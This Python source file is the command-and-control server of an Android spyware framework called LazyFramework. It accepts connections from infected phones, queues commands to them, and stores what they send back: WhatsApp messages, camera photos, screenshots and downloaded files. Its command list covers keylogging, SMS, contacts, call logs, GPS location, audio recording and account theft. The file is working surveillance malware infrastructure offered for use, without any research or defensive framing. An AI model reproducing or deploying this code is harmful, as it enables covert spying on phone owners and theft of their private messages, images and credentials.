#!/usr/bin/env python3
"""
LazyFramework C2 Server - Flask + Socket
Complete version with all features
"""

import socket
import json
import threading
import logging
import datetime
import os
import base64
import glob
from flask import Flask, render_template, request, jsonify, session, send_file
from flask_cors import CORS
import hashlib
from config import C2_HOST, C2_PORT, SECRET_KEY, ADMIN_PASSWORD
from database import init_db, save_agent, save_command, save_result, get_agents, get_commands, get_results, get_stats
import queue

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('c2.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ==================== FLASK APP ====================
app = Flask(__name__)
app.secret_key = SECRET_KEY
CORS(app)

# ==================== GLOBAL STATE ====================
agents = {}
command_queue = queue.Queue()
lock = threading.Lock()

# ==================== AGENT HANDLER ====================
class AgentHandler(threading.Thread):
    def __init__(self, client_socket, client_address):
        super().__init__(daemon=True)
        self.socket = client_socket
        self.address = client_address
        self.agent_id = None
        self.device_info = {}
        self.connected = True
        self.last_seen = datetime.datetime.now()
        
    def send_command(self, command_data):
        try:
            if isinstance(command_data, dict):
                command_str = json.dumps(command_data)
            else:
                command_str = command_data
            self.socket.sendall((command_str + '\n').encode('utf-8'))
            logger.info(f"📤 Command sent to {self.agent_id}: {command_data}")
            return True
        except Exception as e:
            logger.error(f"❌ Send error: {e}")
            self.connected = False
            return False
    
    def recv_data(self):
        try:
            data = b''
            while True:
                chunk = self.socket.recv(4096)
                if not chunk:
                    return None
                data += chunk
                if b'\n' in data:
                    break
            return data.decode('utf-8', errors='ignore').strip()
        except Exception as e:
            logger.error(f"❌ Recv error: {e}")
            return None
    
    def handle_beacon(self, beacon_data):
        try:
            self.agent_id = beacon_data.get('id')
            self.device_info = {
                'device': beacon_data.get('device'),
                'android': beacon_data.get('android'),
                'manufacturer': beacon_data.get('manufacturer'),
                'timestamp': beacon_data.get('timestamp')
            }
            self.last_seen = datetime.datetime.now()
            
            save_agent(
                agent_id=self.agent_id,
                device=self.device_info.get('device'),
                android_version=self.device_info.get('android'),
                manufacturer=self.device_info.get('manufacturer'),
                last_seen=self.last_seen
            )
            
            with lock:
                agents[self.agent_id] = self
            
            logger.info(f"✅ Agent connected: {self.agent_id} ({self.device_info.get('device')})")
        except Exception as e:
            logger.error(f"❌ Beacon error: {e}")
    
    def handle_response(self, response_data):
        try:
            command = response_data.get('command')
            agent_id = response_data.get('agent_id')
            result = response_data.get('result')
            timestamp = response_data.get('timestamp')
            command_id = response_data.get('command_id')
            
            # Handle WhatsApp Messages
            if isinstance(result, dict) and result.get('type') == 'whatsapp_messages':
                messages = result.get('messages', '')
                if messages:
                    os.makedirs('whatsapp_messages', exist_ok=True)
                    timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"whatsapp_messages/{agent_id}_messages_{timestamp_str}.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(f"=== WHATSAPP MESSAGES ===\n")
                        f.write(f"Agent: {agent_id}\n")
                        f.write(f"Time: {datetime.datetime.now().isoformat()}\n")
                        f.write(f"{'='*50}\n\n")
                        f.write(messages)
                    logger.info(f"💬 WhatsApp messages saved: {filename}")
                    result['saved_to'] = filename
                    result['message_count'] = len(messages.split('\n'))
            
            # Handle Camera Snapshot
            elif isinstance(result, dict) and result.get('type') == 'camera_snapshot':
                image_data = result.get('image_data')
                if image_data:
                    os.makedirs('photos', exist_ok=True)
                    timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"photos/{agent_id}_snapshot_{timestamp_str}.jpg"
                    image_bytes = base64.b64decode(image_data)
                    with open(filename, 'wb') as f:
                        f.write(image_bytes)
                    logger.info(f"📸 Photo saved: {filename}")
                    result['image_data'] = f"<saved to {filename}>"
                    result['file_path'] = filename
            
            # Handle Screenshot
            elif isinstance(result, dict) and result.get('type') == 'screenshot':
                image_data = result.get('image_data')
                if image_data:
                    os.makedirs('screenshots', exist_ok=True)
                    timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"screenshots/{agent_id}_screenshot_{timestamp_str}.jpg"
                    image_bytes = base64.b64decode(image_data)
                    with open(filename, 'wb') as f:
                        f.write(image_bytes)
                    logger.info(f"🖼️ Screenshot saved: {filename}")
                    result['image_data'] = f"<saved to {filename}>"
                    result['file_path'] = filename
            
            # Handle File Download
            elif isinstance(result, dict) and result.get('type') == 'file_download':
                file_data = result.get('data')
                filename = result.get('filename')
                if file_data and filename:
                    os.makedirs('downloads', exist_ok=True)
                    save_path = f"downloads/{agent_id}_{filename}"
                    file_bytes = base64.b64decode(file_data)
                    with open(save_path, 'wb') as f:
                        f.write(file_bytes)
                    logger.info(f"💾 File downloaded: {save_path}")
                    result['data'] = f"<saved to {save_path}>"
                    result['file_path'] = save_path
            
            # Save to database
            save_result(
                agent_id=agent_id,
                command=command,
                result=json.dumps(result) if isinstance(result, dict) else result,
                command_id=command_id,
                timestamp=timestamp
            )
            
            self.last_seen = datetime.datetime.now()
            logger.info(f"📥 Result received from {agent_id}: {command}")
            
        except Exception as e:
            logger.error(f"❌ Response error: {e}")
    
    def run(self):
        self.socket.settimeout(60)
        try:
            while self.connected:
                data = self.recv_data()
                if data is None:
                    break
                if not data:
                    continue
                try:
                    msg = json.loads(data)
                    msg_type = msg.get('type')
                    if msg_type == 'beacon':
                        self.handle_beacon(msg)
                    elif msg_type == 'response':
                        self.handle_response(msg)
                    elif msg_type == 'PONG':
                        logger.debug(f"🏓 PONG from {self.agent_id}")
                        self.last_seen = datetime.datetime.now()
                except json.JSONDecodeError:
                    logger.warning(f"❌ JSON decode error: {data[:100]}")
        except Exception as e:
            logger.error(f"❌ Handler error: {e}")
        finally:
            self.disconnect()
    
    def disconnect(self):
        try:
            self.connected = False
            self.socket.close()
            if self.agent_id in agents:
                with lock:
                    del agents[self.agent_id]
            logger.info(f"🔌 Agent disconnected: {self.agent_id}")
        except Exception as e:
            logger.error(f"❌ Disconnect error: {e}")

# ==================== SOCKET SERVER ====================
def socket_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((C2_HOST, C2_PORT))
        server_socket.listen(5)
        logger.info(f"🚀 Socket server listening on {C2_HOST}:{C2_PORT}")
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                logger.info(f"🔗 New connection from {client_address}")
                handler = AgentHandler(client_socket, client_address)
                handler.start()
            except Exception as e:
                logger.error(f"❌ Accept error: {e}")
    except Exception as e:
        logger.error(f"❌ Socket server error: {e}")
    finally:
        server_socket.close()

# ==================== COMMAND SENDER ====================
def command_sender():
    while True:
        try:
            pending = get_commands(status='pending', limit=10)
            for cmd in pending:
                agent_id = cmd['agent_id']
                with lock:
                    if agent_id in agents:
                        handler = agents[agent_id]
                        command_data = {
                            'id': cmd['id'],
                            'command': cmd['command'],
                            'timestamp': datetime.datetime.now().isoformat()
                        }
                        if handler.send_command(command_data):
                            save_command(cmd['id'], status='sent')
                        else:
                            logger.warning(f"⚠️ Agent {agent_id} not responding")
            threading.Event().wait(1)
        except Exception as e:
            logger.error(f"❌ Command sender error: {e}")
            threading.Event().wait(5)

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    if 'username' not in session:
        return render_template('login.html')
    return render_template('dashboard.html', agents=get_agents())

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    password = data.get('password', '')
    if hashlib.sha256(password.encode()).hexdigest() == hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest():
        session['username'] = 'admin'
        session.permanent = True
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error', 'message': 'Invalid password'}), 401

@app.route('/logout')
def logout():
    session.clear()
    return jsonify({'status': 'success'})

@app.route('/api/agents')
def api_agents():
    agents_list = []
    with lock:
        for agent_id, handler in agents.items():
            agents_list.append({
                'agent_id': agent_id,
                'device': handler.device_info.get('device'),
                'android_version': handler.device_info.get('android'),
                'manufacturer': handler.device_info.get('manufacturer'),
                'last_seen': handler.last_seen.isoformat(),
                'online': handler.connected
            })
    return jsonify(agents_list)

@app.route('/api/command', methods=['POST'])
def api_command():
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')
    if not agent_id or not command:
        return jsonify({'error': 'Missing agent_id or command'}), 400
    
    cmd_id = save_command(agent_id=agent_id, command=command, status='pending')
    
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            command_data = {'id': cmd_id, 'command': command, 'timestamp': datetime.datetime.now().isoformat()}
            if handler.send_command(command_data):
                save_command(cmd_id, status='sent')
                return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': True})
    
    return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': False, 'message': 'Pending'})

@app.route('/api/results/<agent_id>')
def api_results(agent_id):
    limit = request.args.get('limit', 20, type=int)
    return jsonify(get_results(agent_id=agent_id, limit=limit))

@app.route('/api/ping/<agent_id>', methods=['POST'])
def api_ping(agent_id):
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            try:
                handler.socket.sendall(b'PING\n')
                return jsonify({'status': 'success'})
            except Exception as e:
                return jsonify({'error': str(e)}), 500
    return jsonify({'error': 'Agent not found'}), 404

# ==================== PHOTO ROUTES ====================
@app.route('/api/photos/<agent_id>')
def api_list_photos(agent_id):
    photo_dir = 'photos'
    if not os.path.exists(photo_dir):
        return jsonify({'photos': []})
    pattern = f"{photo_dir}/{agent_id}_snapshot_*.jpg"
    files = glob.glob(pattern)
    photos = []
    for f in files:
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
        photos.append({
            'filename': filename,
            'size': size,
            'size_formatted': format_file_size(size),
            'modified': modified,
            'url': f'/api/photo/{agent_id}/{filename}'
        })
    return jsonify({'agent_id': agent_id, 'count': len(photos), 'photos': photos})

@app.route('/api/photo/<agent_id>/<filename>')
def api_get_photo(agent_id, filename):
    photo_dir = 'photos'
    if not os.path.exists(photo_dir):
        return jsonify({'error': 'No photos'}), 404
    for f in os.listdir(photo_dir):
        if f.startswith(agent_id) and filename in f:
            return send_file(os.path.join(photo_dir, f), mimetype='image/jpeg')
    return jsonify({'error': 'Photo not found'}), 404

# ==================== SCREENSHOT ROUTES ====================
@app.route('/api/screenshots/<agent_id>')
def api_list_screenshots(agent_id):
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        return jsonify({'screenshots': []})
    pattern = f"{screenshot_dir}/{agent_id}_screenshot_*.jpg"
    files = glob.glob(pattern)
    screenshots = []
    for f in files:
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
        screenshots.append({
            'filename': filename,
            'size': size,
            'size_formatted': format_file_size(size),
            'modified': modified,
            'url': f'/api/screenshot/{agent_id}/{filename}'
        })
    return jsonify({'agent_id': agent_id, 'count': len(screenshots), 'screenshots': screenshots})

@app.route('/api/screenshot/<agent_id>/<filename>')
def api_get_screenshot(agent_id, filename):
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        return jsonify({'error': 'No screenshots'}), 404
    for f in os.listdir(screenshot_dir):
        if f.startswith(agent_id) and filename in f:
            return send_file(os.path.join(screenshot_dir, f), mimetype='image/jpeg')
    return jsonify({'error': 'Screenshot not found'}), 404

# ==================== DOWNLOAD ROUTES ====================
@app.route('/api/downloads/<agent_id>')
def api_list_downloads(agent_id):
    download_dir = 'downloads'
    if not os.path.exists(download_dir):
        return jsonify({'downloads': []})
    pattern = f"{download_dir}/{agent_id}_*"
    files = glob.glob(pattern)
    downloads = []
    for f in files:
        filename = os.path.basename(f)
        display_name = filename.replace(f"{agent_id}_", "")
        size = os.path.getsize(f)
        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
        downloads.append({
            'filename': display_name,
            'original': filename,
            'size': size,
            'size_formatted': format_file_size(size),
            'modified': modified,
            'url': f'/api/download/{agent_id}/{filename}'
        })
    return jsonify({'agent_id': agent_id, 'count': len(downloads), 'downloads': downloads})

@app.route('/api/download/<agent_id>/<filename>')
def api_get_download(agent_id, filename):
    download_dir = 'downloads'
    if not os.path.exists(download_dir):
        return jsonify({'error': 'No downloads'}), 404
    for f in os.listdir(download_dir):
        if f.startswith(agent_id) and filename in f:
            return send_file(os.path.join(download_dir, f), as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ==================== WHATSAPP ROUTES ====================
@app.route('/api/whatsapp/<agent_id>')
def api_list_whatsapp(agent_id):
    msg_dir = 'whatsapp_messages'
    if not os.path.exists(msg_dir):
        return jsonify({'messages': []})
    pattern = f"{msg_dir}/{agent_id}_messages_*.txt"
    files = glob.glob(pattern)
    messages = []
    for f in sorted(files, reverse=True):
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
        content = ""
        try:
            with open(f, 'r', encoding='utf-8') as file:
                lines = file.readlines()
                content = ''.join(lines[:50])
                if len(lines) > 50:
                    content += f"\n... and {len(lines) - 50} more lines"
        except:
            content = "Error reading file"
        messages.append({
            'filename': filename,
            'size': size,
            'size_formatted': format_file_size(size),
            'modified': modified,
            'preview': content,
            'url': f'/api/whatsapp_file/{agent_id}/{filename}'
        })
    return jsonify({'agent_id': agent_id, 'count': len(messages), 'messages': messages})

@app.route('/api/whatsapp_file/<agent_id>/<filename>')
def api_get_whatsapp_file(agent_id, filename):
    filepath = f"whatsapp_messages/{filename}"
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ==================== STATUS ROUTES ====================
@app.route('/api/status')
def api_status():
    with lock:
        agent_count = len(agents)
    stats = get_stats()
    return jsonify({
        'status': 'online',
        'agents_connected': agent_count,
        'pending_commands': stats.get('pending_commands', 0),
        'total_results': stats.get('results', 0),
        'timestamp': datetime.datetime.now().isoformat()
    })

@app.route('/api/help')
def api_help():
    commands = [
        "GET_DEVICE_INFO - Get device information",
        "GET_LOCATION - Get GPS location",
        "GET_CLIPBOARD - Get clipboard content",
        "GET_INSTALLED_APPS - List installed apps",
        "GET_CONTACTS - Get contacts (100)",
        "GET_SMS - Get SMS (50)",
        "GET_CALL_LOGS - Get call logs (50)",
        "GET_GALLERY - Get recent photos (50)",
        "GET_FILES_LIST - List files in /sdcard",
        "RECORD_AUDIO - Record audio (30s)",
        "STOP_RECORDING - Stop recording",
        "KEYLOG_START - Start keylogger",
        "KEYLOG_STOP - Stop keylogger",
        "KEYLOG_DUMP - Get keylogs",
        "WA_INFO - Get WhatsApp info",
        "WA_CONTACTS - Get WhatsApp contacts",
        "WA_CAPTURE_START - Start WhatsApp message capture",
        "WA_CAPTURE_STOP - Stop WhatsApp message capture",
        "WA_CAPTURE_DUMP - Get captured WhatsApp messages",
        "WA_CAPTURE_STATS - Get capture statistics",
        "WA_CAPTURE_CLEAR - Clear captured messages",
        "GET_ACCOUNTS - Get device accounts",
        "GET_GOOGLE_ACCOUNTS - Get Google accounts",
        "CAMERA_SNAPSHOT - Take photo with camera",
        "SCREENSHOT - Capture screen",
        "SET_WALLPAPER <URL/base64> - Set wallpaper",
        "SHOW_TOAST - Show toast message",
        "HELP - Show this help"
    ]
    return jsonify({'commands': commands, 'count': len(commands)})

# ==================== HELPER FUNCTIONS ====================
def format_file_size(size):
    if size <= 0:
        return "0 B"
    units = ["B", "KB", "MB", "GB"]
    digit_groups = int((len(str(size)) - 1) / 3)
    return f"{size / (1024 ** digit_groups):.1f} {units[digit_groups]}"

# ==================== ERROR HANDLERS ====================
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(error):
    return jsonify({'error': 'Server error'}), 500

# ==================== MAIN ====================
if __name__ == '__main__':
    init_db()
    os.makedirs('photos', exist_ok=True)
    os.makedirs('screenshots', exist_ok=True)
    os.makedirs('downloads', exist_ok=True)
    os.makedirs('whatsapp_messages', exist_ok=True)
    
    socket_thread = threading.Thread(target=socket_server, daemon=True)
    socket_thread.start()
    
    sender_thread = threading.Thread(target=command_sender, daemon=True)
    sender_thread.start()
    
    logger.info("🚀 LazyFramework C2 Server Starting")
    logger.info(f"📁 Photos directory: photos/")
    logger.info(f"📁 Screenshots directory: screenshots/")
    logger.info(f"📁 Downloads directory: downloads/")
    logger.info(f"📁 WhatsApp messages directory: whatsapp_messages/")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True, use_reloader=False)
